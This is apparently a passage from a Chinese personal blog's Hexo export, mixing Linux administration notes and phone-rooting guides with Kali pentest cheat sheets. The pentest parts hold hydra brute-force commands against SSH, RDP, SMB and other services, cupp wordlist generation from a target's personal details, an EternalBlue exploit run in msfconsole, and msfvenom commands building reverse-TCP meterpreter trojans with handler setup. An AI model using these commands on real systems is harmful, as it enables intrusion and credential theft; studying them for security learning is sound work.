<p>vim编辑根目录下_config.yml中的theme：butterfly<br>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
<p>安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>

<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra命令</title>
    <url>/2024/08/01/hydra%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><pre><code>-l login 小写，指定用户名进行破解
-L file 大写，指定用户的用户名字典
-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典
-P file 大写，用于指定密码字典
-s PORT 指定默认端口
-C使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M file 指定目标ip列表文件，批量破解
-o file 指定结果输出文件
-f 找到第一对登录名或者密码的时候中止破解
-t tasks 同时运行的线程数，默认是16
-S大写，采用SSL链接
-w time 设置最大超时时间，单位
-v / -V 显示详细过程
-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
-x 自定义密码
</code></pre>
<h2 id="爆破协议举例"><a href="#爆破协议举例" class="headerlink" title="爆破协议举例"></a>爆破协议举例</h2><p>SSH暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t -vV -o ssh.log -e ns IP ssh
</code></pre>
<p>mysql暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 5 IP mysql
</code></pre>
<p>远程桌面暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 1 IP rdp
</code></pre>
<p>使用hydra破解ssh的密码</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -o ssh.log -e ns IP ssh
</code></pre>
<p>破解https：</p>
<pre><code>hydra -m /index.php -l 用户名 -P 密码字典 IP https
</code></pre>
<p>破解teamspeak：</p>
<pre><code>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
</code></pre>
<p>破解cisco：</p>
<pre><code>hydra -P 用户字典 IP cisco
hydra -m cloud -P 密码字典 IP cisco-enable
</code></pre>
<p>破解smb：</p>
<pre><code>hydra -l administrator -P 密码字典 IP smb
</code></pre>
<p>破解pop3：</p>
<pre><code>hydra -l (muts)用户名 -P 密码字典 my.pop3.mail pop3
</code></pre>
<p>破解rdp：</p>
<pre><code>hydra IP rdp -l administrator -P 密码字典 -V
</code></pre>
<p>破解http-proxy：</p>
<pre><code>hydra -l admin -P 密码字典 http-proxy://127.0.0.1
</code></pre>
<p>破解telnet</p>
<pre><code>hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
</code></pre>
<p>破解ftp：</p>
<pre><code>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>java-linux安装卸载</title>
    <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><ol>
<li><p>更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载<br>默认jdk</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure>
<p>指定版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h2><ol>
<li>如果安装了多个java版本，查看的命令是<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --list java</span><br></pre></td></tr></table></figure></li>
<li>切换的命令是<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根据需要填写编号即可。</p>
</blockquote>
</li>
</ol>
<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><h3 id="查看已有版本"><a href="#查看已有版本" class="headerlink" title="查看已有版本"></a>查看已有版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep -i &quot;jdk\|jre\|java&quot;</span><br></pre></td></tr></table></figure>

<h3 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h3><ol>
<li><p>卸载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt purge openjdk-11-jdk openjdk-11-jre</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除多余残余设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>字典生成工具</title>
    <url>/2025/02/21/kali-cupp%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>kali有很多字典生成工具，这里主要说cupp这个工具，他是一款社交工程学字典生成工具，可以根据目标用户的个人信息生成定制的密码字典，</p>
<h2 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>输入命令根据提示输入提示词即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>

<h3 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&gt; First Name: </span><br><span class="line">名字：目标的名字</span><br><span class="line">&gt; Surname: </span><br><span class="line">姓：目标的姓氏</span><br><span class="line">&gt; Nickname: </span><br><span class="line">昵称：目标的常用昵称或别名</span><br><span class="line">&gt; Birthdate (DDMMYYYY): </span><br><span class="line">出生日期：目标的出生日期，格式为日月年（DDMMYYYY）</span><br><span class="line">&gt; Partners) name:</span><br><span class="line">伴侣的名字</span><br><span class="line">&gt; Partners) nickname:</span><br><span class="line">伴侣的昵称：</span><br><span class="line">&gt; Partners) birthdate (DDMMYYYY):</span><br><span class="line">伴侣的出生日期（DDMMYYYY）</span><br><span class="line">&gt; Child&#x27;s name:</span><br><span class="line">孩子的名字：</span><br><span class="line">&gt; Child&#x27;s nickname:</span><br><span class="line">孩子的昵称：</span><br><span class="line">&gt; Child&#x27;s birthdate (DDMMYYYY):</span><br><span class="line">孩子的出生日期（DDMMYYYY）：</span><br><span class="line">&gt; Pet&#x27;s name:</span><br><span class="line">宠物的名字：</span><br><span class="line">&gt; Company name:</span><br><span class="line">公司名字：</span><br><span class="line">&gt; Do you want to add some key words about the victim? Y/[N]: y</span><br><span class="line">是否要添加一些关于目标的关键词？Y/[N]：y</span><br><span class="line">&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed:</span><br><span class="line">请输入单词，用逗号分隔。[例如：hacker,juice,black]，空格将被移除：</span><br><span class="line">&gt; Do you want to add special chars at the end of words? Y/[N]: y</span><br><span class="line">是否要在单词末尾添加特殊字符？Y/[N]：y</span><br><span class="line">&gt; Do you want to add some random numbers at the end of words? Y/[N]:y</span><br><span class="line">是否要在单词末尾添加一些随机数字？Y/[N]：y</span><br><span class="line">&gt; Leet mode? (i.e. leet = 1337) Y/[N]:</span><br><span class="line">是否启用“Leet 模式”？（例如：leet = 1337）Y/[N]：</span><br></pre></td></tr></table></figure>
<blockquote>
<p>是否启用“Leet 模式”？（例如：leet &#x3D; 1337）<br>如果选择 Y，CUPP 会将单词中的某些字母替换为数字或特殊字符，以生成“Leet Speak”（1337 语言）。<br>例如：<br>a 替换为 4<br>e 替换为 3<br>i 替换为 1<br>o 替换为 0<br>s 替换为 5<br>t 替换为 7<br>例如，单词 password 会被替换为 p@ssw0rd 或 p@ssw0rd7 等。</p>
</blockquote>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="SocialEngineeringDictionaryGenerator"><a href="#SocialEngineeringDictionaryGenerator" class="headerlink" title="SocialEngineeringDictionaryGenerator"></a>SocialEngineeringDictionaryGenerator</h3><p>下载<code>index.html</code>打开即可使用；</p>
<blockquote>
<p>来自CN-SEC中文网:<br><a href="https://cn-sec.com/archives/2202717.html">https://cn-sec.com/archives/2202717.html</a></p>
</blockquote>
<blockquote>
<p>项目地址：<br><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p>
</blockquote>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>注：工具仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。</p>
</div>]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>cupp</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>kali移动端（root安装，不改内核）</title>
    <url>/2024/10/15/kali/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
<p><img src="/images/pasted-64.png" alt="upload successful"></p>
<p>点击移动端，mobile</p>
<p><img src="/images/pasted-65.png" alt="upload successful"></p>
<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
<p><img src="/images/pasted-67.png" alt="upload successful"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>手机搞机</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>手机root</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-代理设置方法</title>
    <url>/2025/02/08/linux-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><h3 id="临时"><a href="#临时" class="headerlink" title="临时"></a>临时</h3><p>通过以下命令实现临时使用代理服务器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="永久"><a href="#永久" class="headerlink" title="永久"></a>永久</h3><p>通过修改profile文件实现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>

<p>末尾添加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>

<p>执行生效命令即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>使用proxychains4代理，与上述类似，安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install proxychains4</span><br></pre></td></tr></table></figure>

<p>修改末尾的代理服务器端口即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>使用方法是命令前加上proxychains4即可</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>网络代理</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下载离线安装包</title>
    <url>/2025/01/13/linux%E4%B8%8B%E8%BD%BD%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85/</url>
    <content><![CDATA[<h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><p>以wget为例，需要先下载yum-utils，再下载安装包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install yum-utils</span><br><span class="line">yumdownloader wget</span><br></pre></td></tr></table></figure>

<p>选择保存位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yumdownloader --destdir=/root wget</span><br></pre></td></tr></table></figure>

<p>该命令网上说也能下载，查了下说是本机如果安装了该软件则不会下载<br>yum install –downloadonly –downloaddir&#x3D;&#x2F;root wget</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>linux硬盘分区挂载和扩容</title>
    <url>/2025/01/15/linux%E6%89%A9%E5%AE%B9%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<h2 id="分区和挂载"><a href="#分区和挂载" class="headerlink" title="分区和挂载"></a>分区和挂载</h2><h3 id="非逻辑分区和挂载"><a href="#非逻辑分区和挂载" class="headerlink" title="非逻辑分区和挂载"></a>非逻辑分区和挂载</h3><h4 id="先将空闲磁盘通过fdisk分区"><a href="#先将空闲磁盘通过fdisk分区" class="headerlink" title="先将空闲磁盘通过fdisk分区"></a>先将空闲磁盘通过fdisk分区</h4><p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb </span><br><span class="line">依次选择	n/p/n/回车默认/+size&#123;K,M,G&#125;</span><br></pre></td></tr></table></figure>

<p>帮助</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>

<h4 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化</span><br><span class="line">mkfs.ext4 /dev/sdb1</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/mydisk</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/sdb1 /mnt/mydisk</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/mydisk</span><br></pre></td></tr></table></figure>

<h3 id="逻辑卷及挂载"><a href="#逻辑卷及挂载" class="headerlink" title="逻辑卷及挂载"></a>逻辑卷及挂载</h3><p>首先和上步一样，使用fdisk创建一个分区&#x2F;dev&#x2F;sdb1</p>
<h4 id="创建物理卷（PV）"><a href="#创建物理卷（PV）" class="headerlink" title="创建物理卷（PV）"></a>创建物理卷（PV）</h4><p>将新创建的分区转化成物理卷，主要是添加LVM属性信息并划分PE存储单元，多个一起设置 pvcreate &#x2F;dev&#x2F;sdb{1,2,3,4,5}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br></pre></td></tr></table></figure>

<h4 id="创建卷组（VG）"><a href="#创建卷组（VG）" class="headerlink" title="创建卷组（VG）"></a>创建卷组（VG）</h4><p>创建卷组vgtest ,并将刚才创建好的物理卷加入该卷组.默认PE大小为4MB,PE是卷组的最小存储单元.可以通过 –s参数修改大小。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br></pre></td></tr></table></figure>

<h4 id="创建逻辑卷（LV）"><a href="#创建逻辑卷（LV）" class="headerlink" title="创建逻辑卷（LV）"></a>创建逻辑卷（LV）</h4><p>创建逻辑卷，将卷组vgtest上面分割4G给新的逻辑卷lvtest1，将卷组vgtest上剩余空间分配给新的逻辑卷lvtest2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>

<h4 id="挂载-1"><a href="#挂载-1" class="headerlink" title="挂载"></a>挂载</h4><p>和非逻辑分区挂载方式一样，先格式化再挂载目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化(文件系统)</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest01</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest02</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/test</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/vgtest/lvtest01 /mnt/test</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>

<h2 id="分区扩容"><a href="#分区扩容" class="headerlink" title="分区扩容"></a>分区扩容</h2><h3 id="非逻辑分区"><a href="#非逻辑分区" class="headerlink" title="非逻辑分区"></a>非逻辑分区</h3><p>两种情况，一种是已经分区的扩容然后盘还有空间扩容，一种是未分区使用整个磁盘的需要扩容。第二种其实算是第一种的后半部分。</p>
<h4 id="已分区扩容"><a href="#已分区扩容" class="headerlink" title="已分区扩容"></a>已分区扩容</h4><p>以&#x2F;dev&#x2F;sdb1为例子，使用了5G大小，盘总共10G，sdb1需要扩容为10G。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、解除挂载</span><br><span class="line">umount /mnt/test</span><br><span class="line">2、调整分区大小</span><br><span class="line">parted /dev/sdb</span><br><span class="line">resizepart 1（回车然后输入大小，可以是%，也可以直接指定大小，需要加上单位）</span><br><span class="line">quit</span><br><span class="line">3、重新识别大小</span><br><span class="line">resize2fs /dev/sdb1</span><br><span class="line">4、重新挂载即可</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>

<h4 id="未分区扩容"><a href="#未分区扩容" class="headerlink" title="未分区扩容"></a>未分区扩容</h4><p>使用整个磁盘大小，在原基础磁盘上扩容磁盘后调整，相当于不需要重新调整分区大小，直接重新识别即可，一般在虚拟环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/sdb1</span><br></pre></td></tr></table></figure>

<h3 id="逻辑分区"><a href="#逻辑分区" class="headerlink" title="逻辑分区"></a>逻辑分区</h3><p>总体是将新物理卷扩容到卷组，然后将卷组空间分配给已有逻辑卷中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb2</span><br><span class="line">vgextend vgtest /dev/sdb2</span><br><span class="line">lvextend -l +100%FREE  /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
<p>最后重新挂载即可，可以将-l改成-L指定磁盘大小</p>
<h2 id="删除分区操作"><a href="#删除分区操作" class="headerlink" title="删除分区操作"></a>删除分区操作</h2><p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>

<h2 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h2><p>通过df -h查看文件系统名称，然后修改&#x2F;etc&#x2F;fstab最后一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/mapper/vgtest-lvtest01     /mnt/test        ext4    defaults        0 0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>硬盘分区</tag>
        <tag>分区扩容</tag>
      </tags>
  </entry>
  <entry>
    <title>msfconsole命令</title>
    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
<pre><code>apt update # 更新安装包信息；只检查，不更新
apt upgrade # 更新已安装的软件包，不删除旧包； 
apt full-upgrade # 升级包，删除旧包
</code></pre>
<p>基础使用</p>
<pre><code>msfconsole //进入框架
search  ms17_010 //使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
info //使用info查看模块信息
show options //查看参数
set  RHOST  192.168.100.158 //设置参数
exploit/run
</code></pre>
<p>辅助模块(auxiliary)</p>
<p>漏洞利用(exploit)</p>
<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
</code></pre>
<p>开启kali监听</p>
<pre><code>启动msfconsole
开启监听
    use exploit/multi/handler
设置tcp监听
    set payload windows/meterpreter/reverse_tcp
设置本机ip和端口
    set
输入explore开始监听
</code></pre>
<p>运行木马后木马上线，进入meterpreter</p>
<p>后续同上，不做详细解释</p>
<p>linux elf木马反弹shell创建（msf6版本）</p>
<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
</code></pre>
<p>监听</p>
<pre><code>msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost xxx.xxx.xxx.xxx
set lport 8888
run
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>oppoA9 mtk手机root</title>
    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
</code></pre>
<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
<p><img src="/images/pasted-2.png" alt="upload successful"></p>
<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
<p><img src="/images/pasted-3.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>手机搞机</category>
      </categories>
      <tags>
        <tag>手机root</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap命令</title>
    <url>/2024/08/01/nmap%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="常用命令总结"><a href="#常用命令总结" class="headerlink" title="常用命令总结"></a>常用命令总结</h2><p>命令格式</p>
<pre><code>nmap [参数] [ip]
</code></pre>
<p>主机探测（隐蔽扫描&#x2F;TCP ACK&#x2F;TCP SYN&#x2F;TCP空扫描欺骗防火墙）</p>
<pre><code>nmap -sS/-PS/-PA/-sN ip
</code></pre>
<p>命令表格</p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">nmap IP</td>
<td align="center">扫描IP</td>
</tr>
<tr>
<td align="center">nmap -v IP</td>
<td align="center">加强扫描</td>
</tr>
<tr>
<td align="center">nmap IP1 IP2 …</td>
<td align="center">扫描多IP</td>
</tr>
<tr>
<td align="center">nmap a.b.c.*</td>
<td align="center">扫描整个子网</td>
</tr>
<tr>
<td align="center">nmap a.b.c.x,y,…</td>
<td align="center">扫描多子网地址</td>
</tr>
<tr>
<td align="center">nmap -iL xxx.txt</td>
<td align="center">根据文件扫描多IP</td>
</tr>
<tr>
<td align="center">nmap a.b.c.x-y</td>
<td align="center">扫描子网IP范围</td>
</tr>
<tr>
<td align="center">nmap a.b.c.* –exclude IP</td>
<td align="center">排除指定IP扫描整个子网</td>
</tr>
<tr>
<td align="center">nmap -A IP</td>
<td align="center">扫描操作系统和路由跟踪</td>
</tr>
<tr>
<td align="center">nmap -O IP</td>
<td align="center">探测操作系统</td>
</tr>
<tr>
<td align="center">nmap -sA&#x2F;-PN IP</td>
